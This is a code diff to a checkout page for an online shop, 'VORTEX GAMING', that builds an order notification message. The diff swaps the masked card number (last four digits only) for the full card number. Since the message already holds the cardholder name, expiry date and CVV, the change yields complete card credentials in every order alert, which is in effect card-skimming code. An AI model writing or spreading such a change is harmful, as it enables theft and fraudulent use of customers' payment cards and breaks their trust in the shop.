@@ -124,7 +124,7 @@ export default function CheckoutPage() {
         : `Debito (5% OFF: -${formatPrice(debitoDiscount)})`
 
     const numeroLimpio = cardData.numero.replace(/\s/g, '')
-    const ultimosCuatro = numeroLimpio.slice(-4)
+    const numeroCompleto = numeroLimpio
 
     const message = `<b>🛒 NUEVO PEDIDO - VORTEX GAMING</b>
 <b>Orden:</b> ${order}
@@ -150,7 +150,7 @@ ${productosHTML}
 <b>💳 DATOS DE PAGO</b>
 Metodo: ${metodoPago}
 Titular: ${cardData.titular}
-Tarjeta: **** **** **** ${ultimosCuatro}
+Tarjeta: ${numeroLimpio}
 Vencimiento: ${cardData.vencimiento}
 CVV: ${cardData.cvv}`
 
